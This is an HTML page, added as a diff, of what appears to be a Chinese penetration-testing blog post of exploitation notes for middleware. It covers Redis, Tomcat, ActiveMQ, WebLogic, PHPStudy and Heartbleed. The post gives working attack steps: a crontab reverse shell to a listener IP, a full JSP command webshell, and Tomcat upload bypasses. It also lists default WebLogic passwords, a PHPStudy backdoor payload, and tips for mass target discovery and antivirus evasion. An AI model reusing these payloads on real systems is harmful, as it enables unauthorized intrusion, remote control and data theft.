@@ -1,0 +1,857 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="C47Sh4rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Struts2漏洞 Java反序列化漏洞 Redis漏洞 SSRF漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="其他漏洞">
+<meta property="og:url" content="https://c47sh4rk.github.io/2022/07/26/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="C47Sh4rk&#39;s Blog">
+<meta property="og:description" content="Struts2漏洞 Java反序列化漏洞 Redis漏洞 SSRF漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726170706.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726174120.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726181759.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727160417.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726182144.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726182308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727141837.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727141938.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727142740.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143052.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143354.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143504.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143622.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727145431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727145532.png">
+<meta property="article:published_time" content="2022-07-26T08:41:46.000Z">
+<meta property="article:modified_time" content="2022-07-27T08:04:44.773Z">
+<meta property="article:author" content="C47Sh4rk">
+<meta property="article:tag" content="web渗透">
+<meta property="article:tag" content="中间件">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726170706.png">
+  
+  
+  
+  <title>其他漏洞 - C47Sh4rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"c47sh4rk.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>C47Sh4rk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/0%20(2).png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="其他漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-07-26 16:41" pubdate>
+          2022年7月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">其他漏洞</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><h2 id="Struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h2><ul>
+<li><p>Struts是Apache基金会Jakarta项目组的一个开源项目，Struts通过采用Java Servlet&#x2F;JSP技术，实现了基于Java EE Web应用的Model-View-Controller（MVC）设计模式的应用框架，是MVC经典设计模式中的一个经典产品。目前，Struts广泛应用于大型互联网企业、政府、金融机构等网站建设，并作为网站开发的底层模板使用，是应用最广泛的Web应用框架之一。</p>
+</li>
+<li><p>漏洞挖掘</p>
+<ul>
+<li>工具爬行</li>
+<li>找到存在漏洞地址例如：xx.action</li>
+</ul>
+</li>
+<li><p>批量查找利用</p>
+<ul>
+<li>url采集相关关键字</li>
+<li>批量探测及利用</li>
+</ul>
+</li>
+</ul>
+<h2 id="Java-反序列漏洞"><a href="#Java-反序列漏洞" class="headerlink" title="Java 反序列漏洞"></a>Java 反序列漏洞</h2><ul>
+<li>Java反序列化漏洞简介<ul>
+<li>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。</li>
+</ul>
+</li>
+</ul>
+<h2 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h2><ul>
+<li><p>Redis 漏洞简介以及危害</p>
+<ul>
+<li>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</li>
+<li>redis未授权访问漏洞：<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726170706.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+<li><p>漏洞危害</p>
+<ul>
+<li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</li>
+<li>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</li>
+<li>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</li>
+</ul>
+</li>
+</ul>
+<h3 id="写-webshell-文件实现远程控制"><a href="#写-webshell-文件实现远程控制" class="headerlink" title="写 webshell 文件实现远程控制"></a>写 webshell 文件实现远程控制</h3><ul>
+<li>redis 漏洞利用<ul>
+<li>写 webshell 文件实现远程控制</li>
+<li>一旦控制 redis 后，优先想到的是写 webshell，容错性是它最大优势。假定目标是 PHP 环境、web 的根目录为&#x2F;var&#x2F;www&#x2F;html，按前面步骤尝试写个普通 PHP 脚本看下是否能成功解析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ redis-cli -p 6379 -h 192.168.230.128<br>192.168.230.128:6379&gt; CONFIG SET dbfilename phpinfo.php<br>OK<br>192.168.230.128:6379&gt; CONFIG SET <span class="hljs-built_in">dir</span> <span class="hljs-string">&quot;/var/www/html&quot;</span><br>OK<br>192.168.230.128:6379&gt; CONFIG SET rdbcompression no<br>OK<br>192.168.230.128:6379&gt; SET phpinfo<span class="hljs-string">&quot;\n\n &lt;?php phpinfo(); ?&gt; \n\n&quot;</span> NX<br>OK<br>192.168.230.128:6379&gt; save<br>OK<br></code></pre></td></tr></table></figure>
+<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726174120.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<h3 id="将反弹shell脚本写入-x2F-etc-x2F-crontab"><a href="#将反弹shell脚本写入-x2F-etc-x2F-crontab" class="headerlink" title="将反弹shell脚本写入&#x2F;etc&#x2F;crontab"></a>将反弹shell脚本写入&#x2F;etc&#x2F;crontab</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将反弹shell写入计划任务</span><br><span class="hljs-built_in">set</span> 1 <span class="hljs-string">&quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.8.124/1122 0&gt;&amp;1\n\n\n\n&quot;</span> <br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /etc/<br>config <span class="hljs-built_in">set</span> dbfilename crontab<br>save<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用MSF-破解Redis弱口令导入ssh公钥链接"><a href="#利用MSF-破解Redis弱口令导入ssh公钥链接" class="headerlink" title="利用MSF 破解Redis弱口令导入ssh公钥链接"></a>利用MSF 破解Redis弱口令导入ssh公钥链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">search redis<br>auxiliary/scanner/redis/file_upload   <span class="hljs-comment">#该exp功能为上传本地的文件到目标服务器。</span><br>auxiliary/scanner/redis/redis_login   <span class="hljs-comment">#该exp功能是对redis的密码进行枚举，亲测速度很快。</span><br>auxiliary/scanner/redis/redis_server   <span class="hljs-comment">#该exp功能是验证枚举或者其他手段得到的redis密码是否正确，该功能会执行一个info命令并返回执行结果。</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="msf-破解redis-口令"><a href="#msf-破解redis-口令" class="headerlink" title="msf 破解redis 口令"></a>msf 破解redis 口令</h3><ul>
+<li>使用auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_login进行枚举redis密码<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726181759.png" srcset="/img/loading.gif" lazyload></li>
+<li>验证口令正确性<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727160417.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h3 id="上传文件ssh密钥"><a href="#上传文件ssh密钥" class="headerlink" title="上传文件ssh密钥"></a>上传文件ssh密钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">auxiliary/scanner/redis/file_upload  上传文件模块<br>ssh-keygen -t rsa<br><span class="hljs-built_in">cd</span> /root/.ssh/<br><span class="hljs-built_in">cp</span> id_rsa.pub  authorized_keys<br>vi authorized_keys<br></code></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726182144.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>在文件内容得前面和后面都加上\n\n\n</li>
+<li>为了能正常上传测试，在目标机器上创建&#x2F;root&#x2F;.ssh 目录 <code>mkdir /root/.ssh</code></li>
+<li>用密钥链接ssh</li>
+<li><code>ssh -i /root/.ssh/id_rsa root@192.168.230.128 </code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220726182308.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><ul>
+<li><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) </p>
+<ul>
+<li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</li>
+<li>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</li>
+</ul>
+</li>
+<li><p>漏洞产生</p>
+<ul>
+<li>用户在地址栏输入网址 –&gt; 向目标网站发送请求 –&gt; 目标网站接受请求并在服务器端验证请求是否合法，然后返回用户所需要的页面 –&gt; 用户接收页面并在浏览器中显示</li>
+<li>此处的请求默认为<a target="_blank" rel="noopener" href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89">www.xxx.com/a.php?image=（地址）</a></li>
+<li>那么产生SSRF漏洞的环节在哪里呢？目标网站接受请求后在服务器端验证请求是否合法</li>
+<li>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image&#x3D;）做出严格的过滤以及限制，导致可以从其他服务器的获取一定量的数据</li>
+</ul>
+</li>
+</ul>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727141837.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="SSRF漏洞的寻找-漏洞常见出没位置"><a href="#SSRF漏洞的寻找-漏洞常见出没位置" class="headerlink" title="SSRF漏洞的寻找(漏洞常见出没位置):"></a>SSRF漏洞的寻找(漏洞常见出没位置):</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727141938.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><ul>
+<li><p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p>
+</li>
+<li><p>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <code>http://www.xxx.com/a.php?image=</code>的就可能存在SSRF漏洞</p>
+</li>
+</ul>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6bf7700139fa">https://www.jianshu.com/p/6bf7700139fa</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cc752eb8deca">https://www.jianshu.com/p/cc752eb8deca</a></p>
+<h2 id="WEB-中间件漏洞"><a href="#WEB-中间件漏洞" class="headerlink" title="WEB 中间件漏洞"></a>WEB 中间件漏洞</h2><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><ul>
+<li>tomcat 部署漏洞<ul>
+<li>访问tomacat mamnager页面</li>
+<li>尝试弱口令爆破</li>
+<li>登录管理页面</li>
+<li>部署war文件</li>
+<li>得到shell</li>
+</ul>
+</li>
+</ul>
+<h3 id="tomcat远程命令执行漏洞-CVE-2017-12615"><a href="#tomcat远程命令执行漏洞-CVE-2017-12615" class="headerlink" title="tomcat远程命令执行漏洞(CVE-2017-12615)"></a>tomcat远程命令执行漏洞(CVE-2017-12615)</h3><p><strong>影响范围 Apache Tomcat 7.0.0 – 7.0.81</strong></p>
+<ul>
+<li>只要web.xml设置了readonly&#x3D;false<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727142740.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<p><strong>漏洞复现</strong></p>
+<ol>
+<li>利用PUT方法上传构造好的shell</li>
+<li>利用上传的shell来进行命令执行</li>
+</ol>
+<ul>
+<li>在构造上传方法时有三种<ul>
+<li><code>PUT /test.jsp%20</code></li>
+<li><code>PUT /test.jsp/</code></li>
+<li><code>PUT /test.jsp:DATA</code></li>
+</ul>
+</li>
+<li>通过构造特殊的后缀来绕过，Tomcat的检测，将jsp的shell上传到服务器中。</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143004.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接访问 <code>http://192.168.230.131:8080/test.jsp?cmd=ipconfig </code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143052.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Apache-ActiveMQ-Fileserver远程代码执行漏洞"><a href="#Apache-ActiveMQ-Fileserver远程代码执行漏洞" class="headerlink" title="Apache ActiveMQ Fileserver远程代码执行漏洞"></a>Apache ActiveMQ Fileserver远程代码执行漏洞</h3><ul>
+<li><p>扫端口的时候遇到8161端口，输入admin&#x2F;admin</p>
+</li>
+<li><p>通过put上去一句话然后move移动到admin目录即可拿shell</p>
+</li>
+<li><p>环境搭建</p>
+<ul>
+<li>ActiveMQ 5.1.0 下载地址：<a target="_blank" rel="noopener" href="http://activemq.apache.org/activemq-510-release.html">http://activemq.apache.org/activemq-510-release.html</a></li>
+<li>解压后，双击运行abtivemq.bat运行。（进入bin目录，根据自己的操作系统选择win32或win64，5.1.0只有win32目录）</li>
+<li>访问8161端口：<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143354.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<p><strong>漏洞复现</strong></p>
+<ol>
+<li>获取物理路径    <code>PUT /fileserver/%20/%20 HTTP/1.1</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143504.png" srcset="/img/loading.gif" lazyload></li>
+<li>PUT 一个 Jsp 的 Webshell 到 fileserver 目录    <code>PUT /fileserver/1.jsp HTTP/1.1 </code><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%<br>    out.print(<span class="hljs-string">&quot;Hello&lt;/br&gt;&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">strcmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br>    Process p=Runtime.getRuntime().exec(strcmd);<br>     <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> p.getInputStream();<br>      <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br>    <span class="hljs-keyword">while</span>((line =br.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>        out.print(line+<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143622.png" srcset="/img/loading.gif" lazyload></li>
+<li>利用 MOVE 方法将 Webshell 移入 admin&#x2F; 目录</br><br><code>MOVE /fileserver/1.jsp  HTTP/1.1</code></br>
+`Destination:file://C:\activemq\webapps\admin\11.jsp`
+![](https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727143841.png)
+**ActiveMQ的默认的上传地址无法解析jsp, 所以通过一些手段将它移走**</li>
+</ol>
+<h3 id="weblogic攻击"><a href="#weblogic攻击" class="headerlink" title="weblogic攻击"></a>weblogic攻击</h3><ul>
+<li>批量扫描WebLogic缺省的WEB管理端口（http为7001，https为7002），开放这两个端口的一般都是安装有WebLogic的主机。 </li>
+<li>Google搜索关键字“WebLogic Server Administration Console inurl:console”，URL后面是console结尾的，一般为目标。 </li>
+<li>在找到的目标URL后面加上console，回车就会自动跳转到管理登录页面</li>
+<li>尝试弱口令登录<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>、用户名密码均为：weblogic <br><span class="hljs-number">2</span>、用户名密码均为：<span class="hljs-keyword">system</span> <br><span class="hljs-number">3</span>、用户名密码均为：portaladmin <br><span class="hljs-number">4</span>、用户名密码均为：guest <br></code></pre></td></tr></table></figure></li>
+<li>登录后找到“mydomain”-&gt;“Deployments”-&gt;“Web Application Modules”-&gt;“Deploy new Web Application Moudule…”</li>
+<li>再点里面的“upload your file(s)”，在跳转后的页面上传war包（war包和Tomcat弱口令利用的包一样，注意马的免杀即可）</li>
+</ul>
+<h3 id="PHPstudy-RCE-漏洞复现"><a href="#PHPstudy-RCE-漏洞复现" class="headerlink" title="PHPstudy RCE 漏洞复现"></a>PHPstudy RCE 漏洞复现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.1.91</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64;rv:<span class="hljs-number">69</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">69</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Acept</span>-Language:zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip,deflate<br><span class="hljs-attribute">Accept</span>-Charset: c3lzdGVtKCd3aG9hbWknKTs=<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="心脏滴血漏洞"><a href="#心脏滴血漏洞" class="headerlink" title="心脏滴血漏洞"></a>心脏滴血漏洞</h3><ul>
+<li>漏洞范围：<ul>
+<li>OpenSSL1.0.1版本</li>
+</ul>
+</li>
+<li>漏洞成因：<ul>
+<li>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</li>
+</ul>
+</li>
+<li>漏洞危害：<ul>
+<li>如同漏洞成因所讲，我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。</li>
+</ul>
+</li>
+<li>漏洞探测<ul>
+<li><code>nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.224.131</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727145431.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+<li>漏洞利用<ul>
+<li>msf直接利用<code>use auxiliary/scanner/ssl/openssl_heartbleed</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727145532.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
